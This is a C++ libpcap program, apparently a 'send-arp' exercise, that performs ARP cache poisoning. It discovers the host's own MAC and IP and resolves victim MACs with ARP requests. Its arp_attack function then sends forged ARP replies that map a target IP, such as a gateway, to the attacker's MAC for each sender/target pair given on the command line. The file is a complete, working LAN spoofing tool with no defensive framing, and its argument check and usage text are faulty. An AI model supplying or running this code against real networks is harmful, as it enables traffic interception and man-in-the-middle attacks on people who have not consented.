#include <cstdio>
#include <iostream>
#include <pcap.h>
#include <unistd.h>
#include <error.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() 
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int arp_send_packet(pcap_t* handle, Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, uint16_t op)
{
	EthArpPacket 	packet;
	int 			res;

    packet.eth_.dmac_ = dmac; 
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}

int arp_attack(pcap_t* handle, Mac my_mac, Mac sender_mac, Ip target_ip, Ip sender_ip)
{
	int res;

	for (int i = 0; i < 5; i++)
	{
		res = arp_send_packet(handle, sender_mac, my_mac, sender_mac, target_ip, sender_ip, ArpHdr::Reply);

		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return res;
		}
	}

	return 0;
}

Mac find_mac(pcap_t* handle, Ip my_ip, Mac my_mac, Ip ip)
{
	struct pcap_pkthdr* header;
	const u_char* 		packet;
	struct ArpHdr* 		arp_hdr;
	int 				res;

	res = arp_send_packet(handle, Mac::broadcastMac(), my_mac, Mac::nullMac(), my_ip, ip, ArpHdr::Request);
	if (res != 0) 
		return Mac::nullMac();

	while (true) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }

        arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
        if (arp_hdr->op() == ArpHdr::Reply && my_ip == arp_hdr->tip() && my_mac == arp_hdr->tmac() && ip == arp_hdr->sip()) 
            break;
    }

	return arp_hdr->smac();
}

Mac find_my_mac(char* dev)
{	
	struct ifreq 	ifr;
    Mac 			my_mac;
    int 			fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, dev); 

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
	{
		perror("ioctl");
		exit(-1);
	} 
    close(fd);

    my_mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data); 

    return my_mac;
}

Ip find_my_ip(char* dev)
{
	struct ifreq 	ifr;
	uint32_t 		my_ip;
    int 			fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, dev); 

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0)
	{
		perror("ioctl");
		exit(-1);
	} 
    close(fd);
    
	my_ip = *(uint32_t*)(ifr.ifr_addr.sa_data + 2);

	return Ip(my_ip);
}

int main(int argc, char* argv[]) 
{
	char* 	dev = argv[1];
	char 	errbuf[PCAP_ERRBUF_SIZE];
	Ip 		my_ip;
	Mac 	my_mac;
	Ip*	 	sender_ip;
	Ip* 	target_ip;
	Mac		sender_mac;
	Mac		target_mac;
	int	 	res;

	if (argc < 3 && argc & 1) 
	{
		usage();
		return -1;
	}

	my_ip = find_my_ip(dev);
	my_mac = find_my_mac(dev);

	std::cout << "my IP: " << std::string(my_ip) << std::endl;
	std::cout << "my MAC: " << std::string(my_mac) << std::endl;

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	sender_ip = (Ip*)calloc(argc >> 1, sizeof(Ip));
	target_ip = (Ip*)calloc(argc >> 1, sizeof(Ip));

	for (int i = 2; i < argc; i += 2) 
	{
		sender_ip[i >> 1] = Ip(argv[i]);
		target_ip[i >> 1] = Ip(argv[i + 1]);
	}

	for (int i = 2; i < argc; i += 2)
	{
		sender_mac = find_mac(handle, my_ip, my_mac, sender_ip[i >> 1]);
		target_mac = find_mac(handle, my_ip, my_mac, target_ip[i >> 1]);
		if (sender_mac.isNull()) 
		{
			std::cerr << "Cannot find MAC address with IP address(" << std::string(sender_ip[i >> 1]) << ")" << std::endl;
			break;
		}
		if (target_mac.isNull())
		{
			std::cerr << "Cannot find MAC address with IP address(" << std::string(target_ip[i >> 1]) << ")" << std::endl;
			break;
		}

		std::cout << "Attack " << (i >> 1) << std::endl;
		std::cout << "Sender IP: " << std::string(sender_ip[i >> 1]) << std::endl;
		std::cout << "Sender MAC: " << std::string(sender_mac) << std::endl;
		std::cout << "Target IP: " << std::string(target_ip[i >> 1]) << std::endl;
		std::cout << "Target MAC: " << std::string(target_mac) << std::endl;
		std::cout << std::endl;
		
		res = arp_attack(handle, my_mac, sender_mac, target_ip[i >> 1], sender_ip[i >> 1]);
		if (res != 0)
		{
			std::cerr << "arp_attack failed" <<  std::endl;
			break;
		}
	}

	free(sender_ip);
	free(target_ip);
	pcap_close(handle);

	return 0;
}
